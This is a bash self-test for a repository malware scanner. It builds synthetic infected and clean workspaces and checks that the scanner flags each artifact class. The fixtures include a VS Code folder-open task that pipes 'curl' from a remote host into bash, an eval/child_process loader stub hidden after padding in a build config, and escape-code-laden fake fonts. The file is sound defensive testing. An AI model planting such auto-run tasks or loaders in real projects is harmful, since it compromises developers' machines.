#!/usr/bin/env bash
# selftest.sh - build a synthetic infected repository and a clean control, then
#               assert that scan-workspace.sh flags every artifact class in the
#               first and nothing in the second.
#
# No network, no credentials. Run it before trusting a change to the scanner.
#
# Usage: ./selftest.sh

set -uo pipefail
SDIR="$(cd "$(dirname "$0")" && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
FAILED=0

pass() { printf '  ok    %s\n' "$*"; }
fail() { printf '  FAIL  %s\n' "$*"; FAILED=1; }

mkdir -p "$TMP/infected/.vscode" "$TMP/infected/public/fonts" \
         "$TMP/clean/.vscode"    "$TMP/clean/public/fonts"

# --- infected: one file per artifact class --------------------------------
printf 'module.exports = { content: [] }\nconst _0x=global["_V"];// rmcej%%otb%%\n' \
  > "$TMP/infected/tailwind.config.js"
cat > "$TMP/infected/.vscode/tasks.json" <<'EOF'
{ "version": "2.0.0", "tasks": [ { "label": "x", "type": "shell",
  "command": "curl -s https://vscode-settings-config.vercel.app/i | bash",
  "runOptions": { "runOn": "folderOpen" } } ] }
EOF
printf 'MZ\220\000 not a font' > "$TMP/infected/public/fonts/fa-solid-900.woff2"
# A font whose leading bytes are a terminal escape sequence. The scanner must
# never echo these to the operator's console.
printf '\033[2J\033[31mPWNED'        > "$TMP/infected/public/fonts/escape.woff2"
printf '@echo off\ngit commit --amend --no-verify\n' > "$TMP/infected/temp_auto_push.bat"
printf '{"dependencies":{"tailwindcss-style-animate":"^1.0.0"}}\n' > "$TMP/infected/package.json"
{ printf 'export default { plugins: {} }\n'
  for i in $(seq 1 20); do printf '// padding %s\n' "$i"; done
  printf 'const s=require("child_process");eval(Buffer.from("aGk=","base64").toString());\n'
} > "$TMP/infected/postcss.config.mjs"

# --- clean control: the known false positives ------------------------------
printf 'export default { reactStrictMode: true }\n' > "$TMP/clean/next.config.ts"
cat > "$TMP/clean/.vscode/tasks.json" <<'EOF'
{ "version": "2.0.0", "tasks": [ { "label": "build", "type": "shell", "command": "npm run build" } ] }
EOF
: > "$TMP/clean/public/fonts/empty.woff2"
printf 'version https://git-lfs.github.com/spec/v1\noid sha256:abc\n' > "$TMP/clean/public/fonts/lfs.woff2"
printf 'wOF2\000\001\000\000realfontbytes' > "$TMP/clean/public/fonts/real.woff2"
{ printf 'export default [\n'
  for i in $(seq 1 70); do printf '  { rules: {} },\n'; done
  printf ']\n'
} > "$TMP/clean/eslint.config.js"

echo "== infected fixture =="
OUT="$("$SDIR/scan-workspace.sh" --path "$TMP/infected" 2>&1)"; RC=$?
printf '%s\n' "$OUT" | sed 's/^/  | /'
echo
echo "assertions:"
if [[ $RC -eq 2 ]]; then pass "exits 2"; else fail "expected exit 2, got $RC"; fi
for want in "tailwind.config.js" "package.json" "temp_auto_push.bat" \
            "fa-solid-900.woff2" "task runs on folder open" "postcss.config.mjs" \
            "escape.woff2"; do
  if printf '%s\n' "$OUT" | grep -q "$want"; then pass "detected: $want"; else fail "missed: $want"; fi
done

# Output must be free of control characters: a crafted file must not be able to
# drive the terminal of whoever runs this during an incident.
# grep does not interpret octal escapes inside a bracket expression, so strip
# the legitimate whitespace with tr and then look for any remaining control char.
if printf '%s' "$OUT" | LC_ALL=C tr -d '\n\t' | LC_ALL=C grep -q '[[:cntrl:]]'; then
  fail "output contains control characters from a scanned file"
else
  pass "no control characters leak into the output"
fi
if printf '%s\n' "$OUT" | grep -q "first bytes: 1b 5b 32 4a"; then
  pass "escape-sequence font reported as inert hex"
else
  fail "escape-sequence font not reported as hex"
fi

echo
echo "== clean control =="
OUT="$("$SDIR/scan-workspace.sh" --path "$TMP/clean" 2>&1)"; RC=$?
printf '%s\n' "$OUT" | sed 's/^/  | /'
echo
echo "assertions:"
if [[ $RC -eq 0 ]]; then pass "exits 0"; else fail "expected exit 0, got $RC"; fi
if printf '%s\n' "$OUT" | grep -q "infected findings : 0"; then pass "no infected findings"; else fail "false positive"; fi
if printf '%s\n' "$OUT" | grep -q "review findings   : 0";  then pass "no review findings";   else fail "noisy review finding"; fi

# ---------------------------------------------------------------------------
# 2.1.0: escape codes (ADR-0040) and whole package names (ADR-0041). Each case
# mirrors a conformance case of the same name. No fixture carries a payload:
# the indicator and the package name are read from ioc/ here, and the escaped
# form is built from them.
# ---------------------------------------------------------------------------
pick() { sed -e 's/[[:space:]]*$//' -e '/^#/d' -e '/^$/d' "$SDIR/../ioc/$1" | sed -n "${2:-1}p"; }
STRONG="$(pick strong.txt 1)"
BADPKG="$(pick bad-packages.txt 1)"
[[ -n "$STRONG" && -n "$BADPKG" ]] || { echo "indicator set is empty or unreadable"; exit 1; }
STRONG_U=""
for ((u_at = 0; u_at < ${#STRONG}; u_at++)); do
  printf -v u_hex '\\u%04x' "'${STRONG:u_at:1}"
  STRONG_U="$STRONG_U$u_hex"
done
PAD="$(printf '%280s' '')"

# put FILE TEXT: write TEXT verbatim, making the directory.
put() { mkdir -p "$(dirname "$1")"; printf '%s' "$2" > "$1"; }
scan() {
  OUT="$("$SDIR/scan-workspace.sh" "$@" 2>&1)"; RC=$?
  printf '%s\n' "$OUT" | sed 's/^/  | /'
}
want_rc()  { if [[ $RC -eq $2 ]]; then pass "$1: exits $2"; else fail "$1: expected exit $2, got $RC"; fi; }
want()     { if printf '%s\n' "$OUT" | grep -qF -- "$2"; then pass "$1: reports '$2'"; else fail "$1: missing '$2'"; fi; }
want_not() { if printf '%s\n' "$OUT" | grep -qF -- "$2"; then fail "$1: should not report '$2'"; else pass "$1: does not report '$2'"; fi; }
want_quiet() { want "$1" "infected findings : 0"; want "$1" "review findings   : 0"; }
NL='
'

# escaped-loader-in-a-build-config-is-found and
# escaped-indicator-in-a-folder-open-task-is-found
D="$TMP/escaped"
put "$D/postcss.config.mjs" "export default { plugins: {} }${NL}${PAD}global.i='${STRONG_U}';${NL}"
put "$D/src/index.js" "export const hello = () => 'world'${NL}"
put "$D/.vscode/tasks.json" "{\"tasks\":[{\"runOptions\":{\"runOn\":\"\\u0066olderOpen\"},\"command\":\"${STRONG_U}\"}]}${NL}"
echo; echo "== escaped loader =="
scan --path "$D"
want_rc "escaped" 2
want "escaped" "postcss.config.mjs: contains an indicator once its escape codes are decoded"
want "escaped" ".vscode/tasks.json: task runs on folder open and contains an indicator"
want_not "escaped" "src/index.js"

# The same tree with perl taken away: the gap is a review line, never a pass.
echo; echo "== escaped loader, no perl =="
POLINRIDER_PERL=/nonexistent/perl scan --path "$D" --fail-on review
want_rc "no perl" 1
want "no perl" "were not decoded because perl is not installed"

# ordinary-escapes-are-not-an-indicator
D="$TMP/ordinary"
put "$D/vite.config.js" "// caf\\u00e9, na\\u00efve, \\u00fcber, \\x41\\x42\\x43, \\u{1F600}${NL}export const labels = { yes: 'S\\u00ed', no: 'N\\u00e3o', sep: '\\x2c' }${NL}export default { plugins: [] }${NL}"
put "$D/package.json" "{\"name\":\"proj\",\"description\":\"caf\\u00e9 \\u00fcber\",\"dependencies\":{\"react\":\"^18.0.0\"}}${NL}"
put "$D/src/i18n.js" "// caf\\u00e9, na\\u00efve, \\u00fcber, \\x41\\x42\\x43, \\u{1F600}${NL}export const labels = { yes: 'S\\u00ed', no: 'N\\u00e3o', sep: '\\x2c' }${NL}"
echo; echo "== ordinary escapes =="
scan --path "$D" --fail-on review
want_rc "ordinary escapes" 0
want_quiet "ordinary escapes"

# known-bad-package-in-every-lockfile-format, plus the name standing whole
# outside a manifest
D="$TMP/lockfiles"
put "$D/npm/package.json" "{\"name\":\"npm-proj\",\"dependencies\":{\"react\":\"^18.0.0\"}}${NL}"
put "$D/npm/package-lock.json" "{\"name\":\"npm-proj\",\"lockfileVersion\":3,\"packages\":{\"\":{\"name\":\"npm-proj\",\"dependencies\":{\"react\":\"^18.0.0\"}},\"node_modules/react\":{\"version\":\"18.2.0\"},\"node_modules/react/node_modules/${BADPKG}\":{\"version\":\"1.0.0\"}}}${NL}"
put "$D/yarn/yarn.lock" "# yarn lockfile v1${NL}${NL}${NL}react@^18.0.0:${NL}  version \"18.2.0\"${NL}  dependencies:${NL}    ${BADPKG} \"^1.0.0\"${NL}${NL}${BADPKG}@^1.0.0:${NL}  version \"1.0.0\"${NL}"
put "$D/pnpm/pnpm-lock.yaml" "lockfileVersion: '9.0'${NL}${NL}importers:${NL}${NL}  .:${NL}    dependencies:${NL}      react:${NL}        specifier: ^18.0.0${NL}        version: 18.2.0${NL}${NL}packages:${NL}${NL}  react@18.2.0:${NL}    resolution: {integrity: sha512-x}${NL}${NL}  ${BADPKG}@1.0.0:${NL}    resolution: {integrity: sha512-y}${NL}"
put "$D/scripts/setup.sh" "npm i ${BADPKG}${NL}"
echo; echo "== campaign package in every lockfile format =="
scan --path "$D"
want_rc "lockfiles" 2
want "lockfiles" "npm/package-lock.json: known-bad package referenced: ${BADPKG}"
want "lockfiles" "yarn/yarn.lock: known-bad package referenced: ${BADPKG}"
want "lockfiles" "pnpm/pnpm-lock.yaml: known-bad package referenced: ${BADPKG}"
want "lockfiles" "scripts/setup.sh"
want_not "lockfiles" "npm/package.json"
want_not "lockfiles" "could not be read as a manifest"

# The same tree with jq taken away: JSON is matched as text and said to be.
echo; echo "== campaign package in every lockfile format, no jq =="
POLINRIDER_JQ=/nonexistent/jq scan --path "$D"
want_rc "no jq" 2
want "no jq" "npm/package-lock.json: could not be read as a manifest because jq is not installed"
want "no jq" "yarn/yarn.lock: known-bad package referenced: ${BADPKG}"

# bad-package-name-inside-a-longer-name-is-not-a-dependency, in manifests and
# in ordinary text, and under somebody else's scope
D="$TMP/longer"
put "$D/package.json" "{\"name\":\"proj\",\"dependencies\":{\"${BADPKG}-utils\":\"^2.0.0\",\"react\":\"^18.0.0\"}}${NL}"
put "$D/yarn.lock" "# yarn lockfile v1${NL}${NL}${NL}\"${BADPKG}-utils@^2.0.0\":${NL}  version \"2.0.0\"${NL}"
put "$D/pnpm-lock.yaml" "lockfileVersion: '9.0'${NL}${NL}packages:${NL}${NL}  '${BADPKG}-utils@2.0.0':${NL}    resolution: {integrity: sha512-x}${NL}"
put "$D/src/use.js" "import a from '${BADPKG}-utils'${NL}import b from '@other/${BADPKG}'${NL}// not-${BADPKG}${NL}"
echo; echo "== campaign name inside a longer name =="
scan --path "$D" --fail-on review
want_rc "longer name" 0
want_quiet "longer name"

# bad-package-name-in-a-description-is-not-a-dependency. The binary calls this
# clean with no review line, and so does this.
D="$TMP/description"
put "$D/package.json" "{\"name\":\"proj\",\"description\":\"A safe replacement for ${BADPKG}\",\"keywords\":[\"${BADPKG}\"],\"dependencies\":{\"react\":\"^18.0.0\"}}${NL}"
echo; echo "== campaign name in a description =="
scan --path "$D" --fail-on review
want_rc "description" 0
want_quiet "description"
want_not "description" "package.json"

# unreadable-manifest-is-review-not-clean
D="$TMP/unreadable"
put "$D/plain/package.json" "{\"name\":\"plain\", \"dependencies\": {\"react\": \"^18.0.0\",}${NL}"
echo; echo "== unreadable manifest =="
scan --path "$D" --fail-on review
want_rc "unreadable" 1
want "unreadable" "plain/package.json: could not be read as a manifest, so package names were matched as text"
want_not "unreadable" "INFECTED"

# unreadable-manifest-naming-a-campaign-package-is-still-confirmed
D="$TMP/unreadable-named"
put "$D/named/package-lock.json" "{\"name\":\"named\",\"lockfileVersion\":3,\"packages\":{${NL}<<<<<<< HEAD${NL}\"node_modules/${BADPKG}\":{\"version\":\"1.0.0\"}${NL}=======${NL}\"node_modules/react\":{\"version\":\"18.2.0\"}${NL}>>>>>>> theirs${NL}}}${NL}"
echo; echo "== unreadable manifest naming a campaign package =="
scan --path "$D"
want_rc "unreadable named" 2
want "unreadable named" "named/package-lock.json: could not be read as a manifest, so package names were matched as text"
want "unreadable named" "INFECTED  named/package-lock.json:"

# An escaped loader and a campaign dependency that survive only on an older
# ref. The working tree is clean; --all-refs is what finds them, and a tag on
# the same commit is answered from the blobs already read.
D="$TMP/history"
g() { git -C "$D" -c user.name=fixture -c user.email=fixture@localhost -c commit.gpgsign=false "$@"; }
mkdir -p "$D"; g init -q
put "$D/lib/loader.js" "global.i='${STRONG_U}';${NL}"
put "$D/package.json" "{\"name\":\"proj\",\"dependencies\":{\"${BADPKG}\":\"^1.0.0\"}}${NL}"
g add -A; g commit -q -m one; g branch old; g tag v0
put "$D/lib/loader.js" "export const ok = true${NL}"
put "$D/package.json" "{\"name\":\"proj\",\"dependencies\":{\"react\":\"^18.0.0\"}}${NL}"
g add -A; g commit -q -m two
echo; echo "== history, working tree only =="
scan --path "$D"
want_rc "history without --all-refs" 0
echo; echo "== history, every ref =="
scan --path "$D" --all-refs
want_rc "history" 2
want "history" "refs/heads/old:lib/loader.js: contains an indicator once its escape codes are decoded"
want "history" "refs/tags/v0:lib/loader.js: contains an indicator once its escape codes are decoded"
want "history" "refs/heads/old:package.json: known-bad package referenced: ${BADPKG}"

echo
if [[ $FAILED -eq 0 ]]; then echo "SELFTEST PASSED"; exit 0; fi
echo "SELFTEST FAILED"; exit 1
